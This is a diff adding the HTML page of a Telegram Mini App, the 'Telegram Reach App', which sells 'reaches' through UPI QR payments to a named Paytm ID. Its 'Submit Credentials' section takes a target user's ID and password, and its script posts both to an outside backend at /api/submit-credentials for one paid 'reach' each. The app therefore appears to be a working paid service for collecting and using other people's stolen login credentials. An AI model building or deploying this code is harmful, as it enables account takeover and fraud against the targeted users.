@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Reach Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #151e27;
+            color: #ffffff;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .card {
+            background-color: #212d3b;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        .qr-box {
+            background: white;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            margin: 10px 0;
+        }
+        .qr-box img {
+            width: 180px;
+            height: 180px;
+            display: block;
+        }
+        .upi-id {
+            font-size: 13px;
+            color: #0088cc;
+            margin-top: 5px;
+            word-break: break-all;
+        }
+        button {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #006699;
+        }
+        input, select {
+            width: 90%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 5px;
+            border: 1px solid #0088cc;
+            background: #151e27;
+            color: white;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>🚀 Telegram Reach App</h2>
+
+    <!-- User Info Section -->
+    <div class="card">
+        <h3>User Profile</h3>
+        <p>Telegram ID: <span id="user-id">Loading...</span></p>
+        <p>Available Reaches: <b id="reaches-count">0</b></p>
+    </div>
+
+    <!-- Buy Reach Section -->
+    <div class="card">
+        <h3>Buy Reaches</h3>
+        <select id="package-select">
+            <option value="pack_1">1 Reach - ₹20</option>
+            <option value="pack_3">3 Reaches - ₹55</option>
+            <option value="pack_6">6 Reaches - ₹100</option>
+            <option value="pack_14">14 Reaches - ₹200</option>
+        </select>
+
+        <!-- QR Code Section -->
+        <p style="margin-bottom: 5px; font-size: 14px; color: #a2b0bc;">Scan & Pay via any UPI App:</p>
+        <div class="qr-box">
+            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=paytm.s2ujlw0@pty%26pn=Paytm" alt="Payment QR Code">
+        </div>
+        <div class="upi-id">UPI ID: <b>paytm.s2ujlw0@pty</b></div>
+
+        <input type="text" id="utr-input" placeholder="Enter UTR / Transaction ID">
+        <button onclick="requestPurchase()">Submit Payment</button>
+    </div>
+
+    <!-- Submit Target Credentials Section -->
+    <div class="card">
+        <h3>Submit Credentials</h3>
+        <input type="text" id="target-id" placeholder="Target User ID">
+        <input type="password" id="target-pass" placeholder="Target Password">
+        <button onclick="submitCredentials()">Submit Data (1 Reach)</button>
+    </div>
+
+    <script>
+        const BACKEND_URL = "https://jpw-mini-app-backend.onrender.com";
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        const user = tg.initDataUnsafe?.user || { id: "123456789" }; // Fallback ID for testing
+        document.getElementById("user-id").innerText = user.id;
+
+        // Initialize User Data
+        async function initUser() {
+            try {
+                const res = await fetch(`${BACKEND_URL}/api/user/init`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ telegramId: user.id })
+                });
+                const data = await res.json();
+                if(data.success) {
+                    document.getElementById("reaches-count").innerText = data.user.reaches;
+                }
+            } catch (err) {
+                console.error("Init Error:", err);
+            }
+        }
+
+        // Request Purchase
+        async function requestPurchase() {
+            const packageId = document.getElementById("package-select").value;
+            const utrNumber = document.getElementById("utr-input").value;
+
+            if(!utrNumber) {
+                alert("Please enter UTR Number");
+                return;
+            }
+
+            try {
+                const res = await fetch(`${BACKEND_URL}/api/request-purchase`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        telegramId: user.id,
+                        packageId: packageId,
+                        utrNumber: utrNumber
+                    })
+                });
+                const data = await res.json();
+                if(data.success) {
+                    alert(data.message);
+                    document.getElementById("utr-input").value = '';
+                } else {
+                    alert(data.error || "Request failed.");
+                }
+            } catch (err) {
+                alert("Server Connection Failed");
+            }
+        }
+
+        // Submit Credentials
+        async function submitCredentials() {
+            const targetId = document.getElementById("target-id").value;
+            const targetPassword = document.getElementById("target-pass").value;
+
+            if(!targetId || !targetPassword) {
+                alert("Please fill both fields.");
+                return;
+            }
+
+            try {
+                const res = await fetch(`${BACKEND_URL}/api/submit-credentials`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        telegramId: user.id,
+                        targetId: targetId,
+                        targetPassword: targetPassword
+                    })
+                });
+                const data = await res.json();
+                if(data.success) {
+                    alert("Submitted Successfully!");
+                    document.getElementById("reaches-count").innerText = data.remainingReaches;
+                    document.getElementById("target-id").value = '';
+                    document.getElementById("target-pass").value = '';
+                } else {
+                    alert(data.error);
+                }
+            } catch (err) {
+                alert("Server Connection Failed");
+            }
+        }
+
+        initUser();
+    </script>
+</body>
+</html>
